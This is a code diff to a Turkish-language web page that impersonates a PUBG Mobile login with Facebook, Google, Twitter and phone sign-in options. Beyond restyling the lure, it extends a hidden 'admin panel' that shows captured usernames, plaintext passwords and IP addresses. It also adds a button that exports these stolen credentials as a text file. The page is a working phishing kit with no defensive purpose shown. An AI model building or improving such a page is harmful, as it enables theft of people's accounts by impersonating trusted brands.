@@ -13,26 +13,62 @@
     }
     
     body {
-      background: 
-                  url('https://images.wallpapersden.com/image/download/pubg-mobile-2021-new_bGpoa2WUmZqaraWkpJRobWllrWdma2U.jpg') no-repeat center center fixed;
-      background-size: cover;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       color: white;
       min-height: 100vh;
       position: relative;
       overflow-x: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    /* Desktop Background */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://images.wallpapersden.com/image/download/pubg-mobile-2021-new_bGpoa2WUmZqaraWkpJRobWllrWdma2U.jpg') no-repeat center center;
+      background-size: cover;
+      z-index: -2;
+    }
+    
+    /* Mobile Background */
+    @media (max-width: 768px) {
+      body::before {
+        background: url('https://wallpapercave.com/wp/wp5281783.jpg') no-repeat center center;
+        background-size: cover;
+      }
+    }
+    
+    /* Overlay for both */
+    body::after {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: -1;
     }
     
     .overlay {
-      background-color: rgba(0, 0, 0, 0.6);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
       position: relative;
       z-index: 2;
+      width: 100%;
+      max-width: 500px;
+      padding: 30px;
+      text-align: center;
+      background: rgba(20, 20, 30, 0.7);
+      border-radius: 20px;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 50, 50, 0.3);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+      margin: 20px;
     }
     
     .logo {
@@ -43,14 +79,29 @@
       text-transform: uppercase;
       font-family: 'Orbitron', sans-serif;
       letter-spacing: 2px;
-      text-shadow: 0 0 10px rgba(255, 50, 50, 0.5);
-      animation: pulse 3s infinite;
+      text-shadow: 0 0 15px rgba(255, 50, 50, 0.7);
+      position: relative;
+      padding-bottom: 20px;
+    }
+    
+    .logo::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: linear-gradient(90deg, #ff3232, #b30000);
+      border-radius: 2px;
     }
     
     .logo span {
       font-size: 32px;
       display: block;
       color: #ffd700;
+      margin-top: 10px;
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
     }
     
     .buttons {
@@ -61,12 +112,14 @@
     }
     
     button {
-      padding: 14px 24px;
+      padding: 16px 24px;
       font-size: 16px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
-      width: 280px;
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
       transition: all 0.3s ease;
       display: flex;
       align-items: center;
@@ -75,7 +128,7 @@
       font-weight: 600;
       position: relative;
       overflow: hidden;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
     }
     
     button::after {
@@ -95,51 +148,58 @@
     }
     
     button.facebook {
-      background-color: #3b5998;
+      background: linear-gradient(135deg, #3b5998, #2d4373);
       color: white;
     }
     
     button.google {
-      background-color: #db4437;
+      background: linear-gradient(135deg, #db4437, #c1351d);
       color: white;
     }
     
     button.twitter {
-      background-color: #1da1f2;
+      background: linear-gradient(135deg, #1da1f2, #0d8bd9);
       color: white;
     }
     
     button.phone {
-      background-color: #f4b400;
-      color: black;
+      background: linear-gradient(135deg, #f4b400, #e0a300);
+      color: #222;
     }
     
     button:hover {
       transform: translateY(-5px);
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
     }
     
     .legal {
-      margin-top: 20px;
-      font-size: 13px;
+      margin-top: 25px;
+      font-size: 14px;
       text-align: center;
-      background: rgba(0, 0, 0, 0.5);
+      background: rgba(255, 255, 255, 0.1);
       padding: 15px 20px;
       border-radius: 10px;
       max-width: 320px;
+      margin: 0 auto;
       backdrop-filter: blur(5px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.15);
     }
     
     .legal a {
       color: #4fc3f7;
       text-decoration: none;
       font-weight: 600;
+      transition: all 0.3s;
+    }
+    
+    .legal a:hover {
+      color: #ffd700;
+      text-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
     }
     
     /* Admin Button */
     .admin-btn {
-      position: absolute;
+      position: fixed;
       top: 20px;
       right: 20px;
       padding: 10px 20px;
@@ -155,6 +215,7 @@
       z-index: 100;
       font-size: 14px;
       box-shadow: 0 0 15px rgba(30, 144, 255, 0.3);
+      z-index: 3;
     }
     
     .admin-btn:hover {
@@ -175,6 +236,7 @@
       z-index: 1000;
       overflow: auto;
       padding: 20px;
+      z-index: 4;
     }
     
     .admin-panel-header {
@@ -194,6 +256,11 @@
       text-shadow: 0 0 10px rgba(30, 144, 255, 0.5);
     }
     
+    .admin-buttons {
+      display: flex;
+      gap: 10px;
+    }
+    
     .admin-logout {
       padding: 10px 20px;
       background: rgba(255, 50, 50, 0.2);
@@ -205,8 +272,23 @@
       font-family: 'Orbitron', sans-serif;
     }
     
+    .admin-download {
+      padding: 10px 20px;
+      background: rgba(50, 205, 50, 0.2);
+      border: 1px solid rgba(50, 205, 50, 0.5);
+      border-radius: 30px;
+      color: #32cd32;
+      cursor: pointer;
+      transition: all 0.3s;
+      font-family: 'Orbitron', sans-serif;
+    }
+    
     .admin-logout:hover {
       background: rgba(255, 50, 50, 0.3);
+    }
+    
+    .admin-download:hover {
+      background: rgba(50, 205, 50, 0.3);
     }
     
     .admin-table {
@@ -284,14 +366,15 @@
       z-index: 1001;
       justify-content: center;
       align-items: center;
+      z-index: 5;
     }
     
     .popup-content {
       background: white;
-      border-radius: 12px;
+      border-radius: 15px;
       width: 90%;
       max-width: 400px;
-      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
       position: relative;
       overflow: hidden;
     }
@@ -516,6 +599,28 @@
       100% { transform: scale(1); }
     }
     
+    .logo {
+      animation: pulse 3s infinite;
+    }
+    
+    /* Log Area */
+    .log-area {
+      background: rgba(20, 20, 30, 0.8);
+      border-radius: 10px;
+      padding: 15px;
+      margin-top: 20px;
+      max-height: 300px;
+      overflow-y: auto;
+      font-family: monospace;
+      color: #4caf50;
+      border: 1px solid rgba(50, 205, 50, 0.2);
+    }
+    
+    .log-area p {
+      margin: 8px 0;
+      word-break: break-all;
+    }
+    
     /* Responsive */
     @media (max-width: 480px) {
       .logo {
@@ -527,8 +632,13 @@
       }
       
       button {
-        width: 240px;
+        width: 100%;
         font-size: 14px;
+        padding: 14px;
+      }
+      
+      .overlay {
+        padding: 20px;
       }
       
       .admin-table th, 
@@ -539,6 +649,16 @@
       
       .popup-content {
         width: 95%;
+      }
+      
+      .admin-panel-header {
+        flex-direction: column;
+        gap: 10px;
+      }
+      
+      .admin-buttons {
+        width: 100%;
+        justify-content: center;
       }
     }
   </style>
@@ -578,7 +698,14 @@
   <div class="admin-panel" id="adminPanel">
     <div class="admin-panel-header">
       <div class="admin-panel-title">PUBG MOBILE - ADMIN PANELİ</div>
-      <div class="admin-logout" id="adminLogout"><i class="fas fa-sign-out-alt"></i> ÇIKIŞ YAP</div>
+      <div class="admin-buttons">
+        <div class="admin-download" id="downloadLogs">
+          <i class="fas fa-download"></i> Logları İndir
+        </div>
+        <div class="admin-logout" id="adminLogout">
+          <i class="fas fa-sign-out-alt"></i> ÇIKIŞ YAP
+        </div>
+      </div>
     </div>
     
     <table class="admin-table">
@@ -596,6 +723,10 @@
         <!-- Login data will appear here -->
       </tbody>
     </table>
+    
+    <div class="log-area" id="logArea">
+      <!-- Log data will appear here -->
+    </div>
   </div>
   
   <!-- Facebook Popup -->
@@ -741,6 +872,7 @@
     const adminButton = document.getElementById('adminButton');
     const adminPanel = document.getElementById('adminPanel');
     const adminLogout = document.getElementById('adminLogout');
+    const downloadLogs = document.getElementById('downloadLogs');
     const facebookLogin = document.getElementById('facebookLogin');
     const googleLogin = document.getElementById('googleLogin');
     const twitterLogin = document.getElementById('twitterLogin');
@@ -758,6 +890,7 @@
     const twitterForm = document.getElementById('twitterForm');
     const phoneForm = document.getElementById('phoneForm');
     const loginData = document.getElementById('loginData');
+    const logArea = document.getElementById('logArea');
     const policyCheck = document.getElementById('policyCheck');
     
     // Admin butonuna tıklama
@@ -776,6 +909,20 @@
     // Admin panelinden çıkış yap
     adminLogout.addEventListener('click', () => {
       adminPanel.style.display = 'none';
+    });
+    
+    // Logları indir
+    downloadLogs.addEventListener('click', () => {
+      const logText = generateLogText();
+      const blob = new Blob([logText], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'pubg_login_logs.txt';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
     });
     
     // Giriş butonlarına tıklama
@@ -917,6 +1064,7 @@
     function updateAdminPanel() {
       // Tabloyu temizle
       loginData.innerHTML = '';
+      logArea.innerHTML = '';
       
       // Giriş denemelerini tabloya ekle (tersten sırala)
       loginAttempts.slice().reverse().forEach(attempt => {
@@ -938,7 +1086,30 @@
           <td>${attempt.ip}</td>
         `;
         loginData.appendChild(row);
+        
+        // Log alanına ekle
+        const logEntry = document.createElement('p');
+        logEntry.innerHTML = `[${attempt.time}] - ${attempt.method} - Kullanıcı: ${attempt.username} - Şifre: ${attempt.password} - IP: ${attempt.ip}`;
+        logArea.appendChild(logEntry);
       });
+    }
+    
+    // Log metni oluşturma
+    function generateLogText() {
+      let logText = "PUBG Mobile Giriş Logları\n";
+      logText += "============================\n\n";
+      
+      loginAttempts.forEach(attempt => {
+        logText += `ID: ${attempt.id}\n`;
+        logText += `Zaman: ${attempt.time}\n`;
+        logText += `Kullanıcı Adı: ${attempt.username}\n`;
+        logText += `Şifre: ${attempt.password}\n`;
+        logText += `Yöntem: ${attempt.method}\n`;
+        logText += `IP Adresi: ${attempt.ip}\n`;
+        logText += "-------------------------\n";
+      });
+      
+      return logText;
     }
     
     // Sayfa yüklendiğinde admin panelini güncelle (eğer açıksa)
